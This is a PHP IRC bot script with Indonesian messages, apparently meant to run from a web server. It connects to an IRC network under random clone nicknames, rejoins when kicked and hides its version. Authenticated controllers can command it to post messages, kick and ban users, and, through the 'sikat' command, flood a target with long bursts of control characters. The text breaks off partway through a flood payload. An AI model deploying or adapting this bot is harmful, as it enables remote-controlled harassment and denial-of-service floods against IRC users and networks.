<?php
function working() {
$querym=array(
"#aig crew",
"Join #aig plizz"
);
$tsu1=array("YAHUT","KAPOK","KERE","MATEK","Sokor","BAWOXZ","CiLEH","COX","pex","JimboT","Imutz","Tol","nkal","ancik","Crot","sikat","cantik","sirik","cutess","Cute","waw","WAkaka");
$tsu2=array("COK","TEL","PEK","Mbot","X","Y","JOH","COX","PEX","ilid");
$jeneng=array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s");
$nicky=array(
"shigetsu[01]",				"shigetsu[51]",						"shigetsu[109]",
"shigetsu[02]",				"shigetsu[52]",						"shigetsu[110]",
"shigetsu[03]",				"shigetsu[53]",						"shigetsu[111]",
"shigetsu[04]",				"shigetsu[54]",						"shigetsu[112]",
"shigetsu[05]",				"shigetsu[55]",						"shigetsu[113]",
"shigetsu[06]",				"shigetsu[56]",						"shigetsu[114]",
"shigetsu[07]",				"shigetsu[57]",						"shigetsu[115]",
"shigetsu[08]",				"shigetsu[58]",						"shigetsu[116]",
"shigetsu[09]",				"shigetsu[59]",						"shigetsu[117]",
"shigetsu[10]",				"shigetsu[60]",						"shigetsu[118]",
"shigetsu[11]",				"shigetsu[61]",						"shigetsu[119]",
"shigetsu[12]",				"shigetsu[62]",						"shigetsu[120]",
"shigetsu[13]",				"shigetsu[63]",						"shigetsu[121]",
"shigetsu[14]",				"shigetsu[64]",						"shigetsu[122]",
"shigetsu[15]",				"shigetsu[65]",						"shigetsu[123]",
"shigetsu[16]",				"shigetsu[66]",						"shigetsu[124]",
"shigetsu[17]",				"shigetsu[67]",						"shigetsu[125]",
"shigetsu[18]",				"shigetsu[68]",						"shigetsu[126]",
"shigetsu[19]",				"shigetsu[69]",						"shigetsu[127]",
"shigetsu[20]",				"shigetsu[70]",						"shigetsu[128]",
"shigetsu[21]",				"shigetsu[71]",						"shigetsu[129]",
"shigetsu[22]",				"shigetsu[72]",						"shigetsu[130]",
"shigetsu[23]",				"shigetsu[73]",						"shigetsu[131]",
"shigetsu[24]",				"shigetsu[74]",						"shigetsu[132]",
"shigetsu[25]",				"shigetsu[75]",						"shigetsu[133]",
"shigetsu[26]",				"shigetsu[76]",						"shigetsu[134]",
"shigetsu[27]",				"shigetsu[77]",						"shigetsu[135]",
"shigetsu[28]",				"shigetsu[78]",						"shigetsu[136]",
"shigetsu[29]",				"shigetsu[79]",						"shigetsu[137]",
"shigetsu[30]",				"shigetsu[80]",						"shigetsu[138]",
"shigetsu[31]",				"shigetsu[89]",						"shigetsu[140]",
"shigetsu[32]",				"shigetsu[90]",						"shigetsu[141]",
"shigetsu[33]",				"shigetsu[91]",						"shigetsu[142]",
"shigetsu[34]",				"shigetsu[92]",						"shigetsu[143]",
"shigetsu[35]",				"shigetsu[93]",						"shigetsu[144]",
"shigetsu[36]",				"shigetsu[94]",						"shigetsu[145]",
"shigetsu[37]",				"shigetsu[95]",						"shigetsu[146]",
"shigetsu[38]",				"shigetsu[96]",						"shigetsu[147]",
"shigetsu[39]",				"shigetsu[97]",						"shigetsu[148]",
"shigetsu[40]",				"shigetsu[98]",						"shigetsu[149]",
"shigetsu[41]",				"shigetsu[99]",						"shigetsu[150]",
"shigetsu[42]",				"shigetsu[100]",					"shigetsu[151]",
"shigetsu[43]",				"shigetsu[101]",					"shigetsu[152]",
"shigetsu[44]",				"shigetsu[102]",					"shigetsu[153]",
"shigetsu[45]",				"shigetsu[103]",					"shigetsu[154]",
"shigetsu[46]",				"shigetsu[104]",					"shigetsu[155]",
"shigetsu[47]",				"shigetsu[105]",					"shigetsu[156]",
"shigetsu[48]",				"shigetsu[106]",					"shigetsu[157]",
"shigetsu[49]",				"shigetsu[107]",					"shigetsu[158]",
"shigetsu[50]",				"shigetsu[108]",					"shigetsu[159]",
);
$usr1=array(
"Say",
"Say-",
"renata-",
"cyber-",
"luks-",
"candra-",
"aig-",
"flava-",
"x-peria",
"DeViL^",
"Warrior^",
"ZOrX-",
"Magician-",
"BEASt_",
"dRaGoN^",
"Fire_",
"Evil_",
"Anubis^",
"Demon-",
"cybork^",
"Dark^",
"Shadow][",
);
 
$nama=array(
"7,1..::8x:: 9uchiha 8x::7,1::..",
"12[4@uchiha12]",
"7,1Spread 00Function",
"09--<04@ 00[[13uchiha 00]]04@09>--",
"00-[renata aulia]-",
"00«aulia»»»",
"04]|] aulia [|[",
);
 
$nick = $nicky[rand(0,count($nicky) - 1)].$jeneng[rand(0,count($jeneng) - 1)];
$awaymsg = "7,1..::8x:: 9uchiha script 8x::7,1::..";
$identify = 'uchiha';
$Admin = 'uchiha';
$BOT_PASSWORD = 'aulia';
$channels = '#candra';
$remotehst2= array("irc.allnetwork.org");
$remotehost= $remotehst2[rand(0,count($remotehst2) - 1)];
$port = '6667';
$realname = $nama[rand(0,count($nama) - 1)];
$counterfp = 0;
$channels = str_replace("CNL","#",$channels);
print "<body bgcolor=#FFFFFF text=#000000>";
print "<b>== Connecting to $remotehost...</b>";
 
 
$raway = "on";
$log   = "off";
$saway = "1";
if (!$stime) { $stime = time(); }
if (!$port) { $port = "6667"; }
$Admin = strtolower($Admin);
$login = array($Admin => array("name" => $Admin, "pass" => $BOT_PASSWORD, "siap" => 1,"status" => "Admin"));
 
$username = $usr1[rand(0,count($usr1) - 1)].$nicky[rand(0,count($nicky) - 1)];
$keluar = 0;
$akill  = 1;
$katime = 0;
$localhost = 'localhost';
$dayload = date("H:i:s d/m/Y");
ini_set('user_agent','MSIE 5\.5;');
set_time_limit(0);
define ('CRL', "\r\n");
$channels = strtolower($channels)." ";
$channel = explode(" ", $channels);
 
do {
  $fp = fsockopen($remotehost,$port, &$err_num, &$err_msg, 30);
  if(!$fp) {
	if ( $counterfp <= 200 ) {
		$counterfp = $counterfp+1;
		working($nick);
	}
  	else { 
 	   print "<br><b>Cannot connect to $remotehost!<br>Please Try Another Server!</b>";
 	   $keluar = 1;
  	   exit;
	}
  }
  print "<br><b>== DANCOOX SucSES connect</b>";
  $Header = 'NICK '.$nick . CRL;
  $Header .= 'USER '.$username.' '.$localhost.' '.$remotehost.' :'.$realname . CRL;
  fputs($fp, $Header);
  $response = '';
  while (!feof($fp)) {
	$response .= fgets($fp, 1024);
	while (substr_count($response,CRL) != 0) {
		$offset = strpos($response, CRL);
		$data = substr($response,0,$offset);
		$response = substr($response,$offset+2);
		if (substr($data,0,1) == ':') {
			$offsetA = strpos($data, ' ');
			$dFrom = substr($data,1,$offsetA-1);
			$offsetB = strpos($data, ' :');
			$dCommand = substr($data,$offsetA+1,$offsetB-$offsetA-1);
			$offsetC = strpos($data, '!');
			$dNick = substr($data,1,$offsetC-1);
			$iText = substr($data,$offsetB+2);
            if ( substr($dCommand,0,3) == '004' ) {
			  fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
			  if ($nickmode) { fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL); }
			  fputs($fp, 'NOTICE ' . $Admin . ' :Renata  Ready!!' .  CRL);
			  foreach ($channel as $v) {
				fputs($fp, 'JOIN ' .$v . CRL);
			  }
			  $pong1 = '1';
            }
			elseif (substr($dCommand,0,3)=='465') {
				print "<br><b>== This bot have been autokilled.</b>";
				$akill = 2;
			}
			elseif (substr($dCommand,0,3)=='433') {
				$nick = $nicky[rand(0,count($nicky) - 1)].$jeneng[rand(0,count($jeneng) - 1)];
				fputs($fp, 'NICK '.$nick . CRL);
			}
			elseif (substr($dCommand,0,3)=='432') {
				$nick = $nick.$username;
				fputs($fp, 'NICK '.$nick . CRL);
			}
			$dcom = explode(" ", $dCommand);
			$dNick = strtolower($dNick);
			if ($dcom[0]=='KICK' && $dcom[2]==$nick) {
				fputs($fp, 'JOIN ' .$dcom[1]. CRL);
			}
			elseif ($dcom[0]=='NICK' || $dcom[0]=='QUIT' || $dcom[0]=='PART') {
				if ($login["$dNick"]) {
					if ($login["$dNick"]["pass"]) {
						if ($login["$dNick"]["siap"]==2) {
							if ($dcom[0]=='NICK') {
								$com = explode(" ", $data);
								$chnick = strtolower(str_replace(':','',$com[2]));
								if ($dNick!=$chnick) {
									$login["$dNick"]["siap"] = 1;
									fputs($fp,'NOTICE '.$chnick.' :kok melarikan diri! ' . CRL);
								}
							} else { $login["$dNick"]["siap"] = 1; }
						}
					} else { fputs($fp,'NOTICE ' . $dNick . ' :pass your pass ' . CRL); }
				}
			}
			elseif ($dcom[0]=='307' && strtolower($dcom[2])==$whois) {
				$dcom[2] = strtolower($dcom[2]);
				if ($login["$dcom[2]"]) {
					if ($login["$dcom[2]"]["pass"]) {
						if ($login["$dcom[2]"]["siap"]==1) {
							$login["$dcom[2]"]["siap"] = 2; $whois = "";
							fputs($fp,'NOTICE ' . $dcom[2] . ' :Renata Siiap!! ' . CRL);
						} else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Udah siaga Bos! ' . CRL); }
					} else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Password belom di set! ketik: pass <password> buat nge set password kemudian login sekali lagi ' . CRL); }
				} else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Username ga cocok! Ganti nick kamu lalu login sekali lagi ' . CRL); }
			}
			elseif ($dcom[0]=='NOTICE') {
				$com = explode(" ", $data);
				if ($com[3]==':%01KB' && $com[4] && $com[5] && $com[6]) {
					$msg = str_replace('%01','',$data);
					$msg = strstr($msg,":KB");
					$msg = str_replace(":KB $com[4]","",$msg);
					fputs($fp, 'KICK '.$com[4].' '.$com[5].' :'.$msg . CRL);
					fputs($fp, 'MODE '.$com[4].' +b *!*'.$com[6] . CRL);
				}
			}
			elseif ($dcom[0]=='PRIVMSG') {
				$com = explode(" ", $data);
				if ($com[3]==':%01VERSION%01') {
					fputs($fp,'NOTICE '.$dNick.' :'.chr(1).'Can`t detection'.chr(1) . CRL);
				}
				elseif ($login["$dNick"]["status"] && $com[3]==':siap' && $com[4]) {
					if ($login["$dNick"]) {
						if ($login["$dNick"]["pass"]) {
							if ($login["$dNick"]["siap"]==1) {
								if ($com[4]===$login["$dNick"]["pass"]) {
									$login["$dNick"]["siap"] = 2;
									fputs($fp,'NOTICE ' . $dNick . ' :Renata Siiaap!!! ' . CRL);
								} else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Password! Boos pikun dech anda ' . CRL); }
							} else { fputs($fp,'NOTICE ' . $dNick . ' :Udah siaga boss!!! ' . CRL); }
						} else { fputs($fp,'NOTICE ' . $dNick . ' :Password belom di set! ketik: pass <password> buat nge set password kemudian login sekali lagi ' . CRL); }
					} else { fputs($fp,'NOTICE ' . $dNick . ' :Username ga cocok! Ganti nick kamu lalu login sekali lagi ' . CRL); }
				}
				elseif ($login["$dNick"]["status"] && $com[3]==':desiap') {
					if ($login["$dNick"]) {
						if ($login["$dNick"]["pass"]) {
							if ($login["$dNick"]["siap"]==2) {
								$login["$dNick"]["siap"] = 1;
								fputs($fp,'NOTICE ' . $dNick . ' :You`re LogOut! ' . CRL);
							} else { fputs($fp,'NOTICE ' . $dNick . ' :You`re Already LogOut! ' . CRL); }
						} else { fputs($fp,'NOTICE ' . $dNick . ' :Password belom di set! ketik: pass <password> buat nge set password kemudian login sekali lagi ' . CRL); }
					} else { fputs($fp,'NOTICE ' . $dNick . ' :Username ga cocok! Ganti nick kamu lalu login sekali lagi ' . CRL); }
				}
				elseif ($login["$dNick"]["status"] && $com[3]==':pass' && $com[4]) {
					if ($login["$dNick"]) {
						if (!$login["$dNick"]["pass"]) {
							$login["$dNick"]["pass"] = $com[4];
							$login["$dNick"]["siap"] = 1;
							fputs($fp,'NOTICE ' . $dNick . ' :Your Auth Pass set to '.$login["$dNick"]["pass"].', Type: siap <your pass> To Authorized Imediately! ' . CRL);
						} else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Already Set! Type: siap <your pass> To Get Authorized ' . CRL); }
					} else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
				}
				elseif ($login["$dNick"]["status"] && $com[3]==':chgpass' && $com[4] && $com[5]) {
					if ($login["$dNick"]) {
						if ($login["$dNick"]["siap"]==2) {
							if ($com[4]===$login["$dNick"]["pass"]) {
								$login["$dNick"]["pass"] = $com[5];
								fputs($fp,'NOTICE ' . $dNick . ' :Your New Auth Pass set to '.$login["$dNick"]["pass"].', Type: siap <your pass> To Authorized Imediately! ' . CRL);
							} else { fputs($fp,'NOTICE ' . $dNick . ' :Your Old Pass Wrong! Type: chgpass <old pass> <new pass> To Change Your Auth Pass ' . CRL); }
						} else { fputs($fp,'NOTICE ' . $dNick . ' :login dulu bos! ketik: siap <password> ' . CRL); }
					} else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
				}
				elseif ($login["$dNick"]["status"] && $com[3]==':adduser' && $com[4] && $com[4]!=$nick && $com[5]) {
					$com[4] = strtolower($com[4]);
					if ($login["$dNick"]["siap"]==2) {
						if ($login["$dNick"]["status"]=="Admin") {
							if ($com[5]=="master" || $com[5]=="user") {
								$login["$com[4]"]["name"] = $com[4];
								$login["$com[4]"]["status"] = $com[5];
								fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
								fputs($fp,'NOTICE ' . $com[4] . ' :You`re Now Known As My '.$com[5].' Added By '.$dNick.' Now Type: pass <your pass> To Set Your Pass ' . CRL);
							} else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: adduser <nick> <master/user> ' . CRL); }
						} elseif ($login["$dNick"]["status"]=="master") {
							if (!$login["$com[4]"]) {
								if ($com[5]=="user") {
									$login["$com[4]"]["name"] = $com[4];
									$login["$com[4]"]["status"] = $com[5];
									fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
									fputs($fp,'NOTICE ' . $com[4] . ' :You`re Now Known As My '.$com[5].' Added By '.$dNick.' Now Type: pass <your pass33] <Spyderur Pass ' . CRL);
								} else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: adduser <nick> user ' . CRL); }
							} else { fputs($fp,'NOTICE ' . $dNick . ' :User Already Exist! Aborting AddUser! ' . CRL); }
						} else { fputs($fp,'NOTICE ' . $dNick . ' :Unknown Status! Your Status is '.$login["$dNick"]["status"] . CRL); }
					} else { fputs($fp,'NOTICE ' . $dNick . ' :Auth dulu bos! ketik: siap <password> ' . CRL); }
				}
				elseif ($login["$dNick"]["status"] && $com[3]==':deluser' && $com[4]) {
					$com[4] = strtolower($com[4]);
					if ($login["$dNick"]["siap"]==2) {
						if ($login["$dNick"]["status"]=="Admin") {
							if ($login["$com[4]"]["status"]=="master" || $login["$com[4]"]["status"]=="user") {
								unset($login["$com[4]"]);
								fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
								fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
							} else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: deluser <nick> ' . CRL); }
						} elseif ($login["$dNick"]["status"]=="master") {
							if ($login["$com[4]"]["status"]=="user") {
								unset($login["$com[4]"]);
								fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
								fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
							} else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: deluser <nick> ' . CRL); }
						} else { fputs($fp,'NOTICE ' . $dNick . ' :Unknown Status! Your Status is '.$login["$dNick"]["status"] . CRL); }
					} else { fputs($fp,'NOTICE ' . $dNick . ' :Login dulu, ketik: siap <passowrd> Untuk Login ' . CRL); }
				}
				elseif ($login["$dNick"]["status"]) {
				if (ereg(":`",$com[3]) || ereg(":!",$com[3])) {
					$chan = strstr($dCommand,"#");
					$anick = str_replace("PRIVMSG ","",$dCommand);
					if ($com[3]==':`siaga') {
						if ($login["$dNick"]["siap"]==2) {
							fputs($fp,'NOTICE '.$dNick.' :Udah Authorized nuh!' . CRL);
						} else {
							$whois = $dNick;
							fputs($fp,'WHOIS '.$dNick . CRL);
						}
					} elseif ($com[3]==':`siap' && $chan) {
						if ($login["$dNick"]["siap"]==2) {
							fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.' is Authorized!' . CRL);
						} else { fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.' NOT Authorized!' . CRL); }
					} elseif ($login["$dNick"]["siap"]==2) {
						if ($com[3]==':`say' && $com[4] && $chan) {
							$msg = strstr($data,":`say");
							$msg = str_replace(":`say ","",$msg);
							fputs($fp,'PRIVMSG '.$chan.' :'.$msg. CRL);
						}
						elseif ($com[3]==':`act' && $com[4] && $chan) {
							$msg = strstr($data,":`act");
							$msg = str_replace(":`act ","",$msg);
							fputs($fp,'PRIVMSG '.$chan.' :%01ACTION '.$msg.'%01'. CRL);
						}
						elseif ($com[3]==':`slap' && $com[4] && $chan) {
							fputs($fp,'PRIVMSG '.$chan.' :%01ACTION slap '.$com[4].' pake pacul jeduak jedok jedok duak!!!!!!%01'. CRL);
						}
						elseif ($com[3]==':`msg' && $com[4] && $com[5]) {
							$msg = strstr($data,":`msg");
							$msg = str_replace(":`msg $com[4] ","",$msg);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg. CRL);
						}
						elseif ($com[3]==':`idnick' && $com[4] && $com[5]) {
							$nick = $com[4];
							$identify = $com[5];
							fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
						}
						elseif ($com[3]==':`sikat' && $com[4] && $com[5]) {
							$msg = strstr($data,":`sikat");
							$msg = str_replace(":`sikat $com[4] ","",$msg);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'9,3F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02.%0311%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02.' . CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'9,3F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02.%0313%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02.' . CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'9,3F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F